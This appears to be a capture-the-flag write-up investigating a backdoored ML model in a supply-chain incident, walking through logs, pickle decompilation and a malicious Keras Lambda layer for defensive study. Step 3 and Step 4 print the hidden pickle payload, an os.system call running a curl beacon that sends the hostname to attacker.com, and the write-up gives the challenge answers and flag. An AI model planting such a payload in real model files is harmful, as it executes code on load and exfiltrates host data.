# Payload — AI Supply Chain Attack

## Challenge Overview

The challenge provides an **incident directory** on a virtual machine containing deployment logs, network captures, and ML model files. A production code-review model has been phoning home to an attacker's server. The goal is to investigate the full attack chain and recover the flag.

```
/opt/supply-chain/incident/
├── logs/
│   ├── deployment.log
│   └── beacon_capture.log
└── models/
    ├── original_model.pkl
    ├── production_model.pkl
    └── candidate_model.h5
```

---

## Exploitation

### Step 1 — Read the Deployment Log

```bash
cat /opt/supply-chain/incident/logs/deployment.log
```

The log shows the original model was deployed from `verified-ml-team` on Hugging Face. On January 26th, a model update replaced it with one from a **different organisation**:

```
[2024-01-26 14:32:12] Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2
[2024-01-26 14:32:14] WARN  New source organisation detected: trustworthy-ai-lab
```

✅ Replacement organisation: **trustworthy-ai-lab**

### Step 2 — Calculate Days Between Deployment and Alert

```
Deployed: 2024-01-26
Alert:    2024-02-16
```

Jan 26 → Jan 31 = 5 days, Feb 1 → Feb 16 = 15 days — a total of **21 days** elapsed including the hours.

### Step 3 — Decompile the Production Model

```bash
python3 -m pickletools /opt/supply-chain/incident/models/production_model.pkl
```

```
'os'
'system'        ← Python function used to execute shell commands
'curl "http://attacker.com/beacon" -d "host=$(hostname)"'
```

The payload uses Python's **`os.system()`** to execute a shell command. Pickle files execute arbitrary Python code on load — making them a dangerous vector for supply chain attacks.

### Step 4 — Identify the Shell Command

The decompiled payload reveals:

```bash
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

`$(hostname)` is a Bash command substitution — it executes `hostname` at runtime and inserts the result, capturing and exfiltrating the machine's identity to the attacker's server.

### Step 5 — Read the Beacon Capture Log

```bash
cat /opt/supply-chain/incident/logs/beacon_capture.log
```

```
[2024-02-16 03:13:47] REQUEST POST /beacon HTTP/1.1
[2024-02-16 03:13:47] PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_
[2024-02-16 03:13:48] SESSION beacon-4821 BLOCKED
```

✅ HTTP method: **POST**

The payload was cut off mid-transmission when the SOC rule blocked the connection — only the first half of the flag was captured.

### Step 6 — Inspect the Candidate Replacement Model

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py \
  /opt/supply-chain/incident/models/candidate_model.h5
```

```
[OK]      InputLayer    input_layer_2
[OK]      Flatten       flatten_2
[OK]      Dense         dense_4
[OK]      Dense         dense_5
[WARNING] Lambda        manipulate_output
          exfil_suffix: pl41n_s1ght}
```

✅ Suspicious layer: **manipulate_output**

The Lambda layer contains arbitrary Python code and embeds the second half of the flag — the attacker staged a second backdoored model ready for deployment.

### Step 7 — Reconstruct the Flag

Combining the truncated beacon payload with the suffix found in the candidate model:

```
THM{b4ckd00r_1n_  +  pl41n_s1ght}
```

🏁 Flag retrieved.

---

## Key Takeaway

> **ML models are code, not just data.** Pickle files execute arbitrary Python on load, and Keras Lambda layers can embed hidden functions that run at inference time. Always verify model sources, check for organisation changes in registries, and scan models with tools like `modelscan` or `fickling` before deploying to production.
```
